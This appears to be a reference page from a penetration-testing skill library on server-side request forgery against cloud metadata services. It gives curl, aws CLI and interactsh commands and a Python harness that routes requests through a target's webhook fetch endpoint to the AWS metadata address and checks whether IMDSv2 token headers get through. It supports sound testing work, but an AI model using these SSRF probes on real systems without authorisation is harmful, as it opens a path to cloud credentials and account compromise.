# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ssrf-cloud-metadata`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/webhook?url=http://169.254.169.254/latest/meta-data/instance-id'` | Test link-local reachability via the fetch endpoint using a non-sensitive key | Cross-platform |
| `aws CLI` | `aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions'` | Confirm whether IMDSv2 is enforced and the hop limit, to scope exploitability | Linux, macOS, Windows |
| `interactsh-client` | `interactsh-client -v` | Confirm a server-origin fetch when the metadata body is not reflected | Cross-platform |

## Minimal Script Shape

A header-contract harness: it requests the metadata base through the fetch endpoint both plain and with a token header, reporting whether the header-bearing path returns content the plain path does not.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/webhook"
META = "http://169.254.169.254/latest/meta-data/instance-id"

def via_fetch(headers):
    url = BASE + "?" + urllib.parse.urlencode({"url": META})
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as exc:
        return exc.code, 0

plain = via_fetch({})
tokened = via_fetch({"X-Forward-Token": "<token-from-put>"})
print({"plain": plain, "with_token_header": tokened,
       "imdsv2_reachable": tokened[1] > 0 and tokened != plain})
```
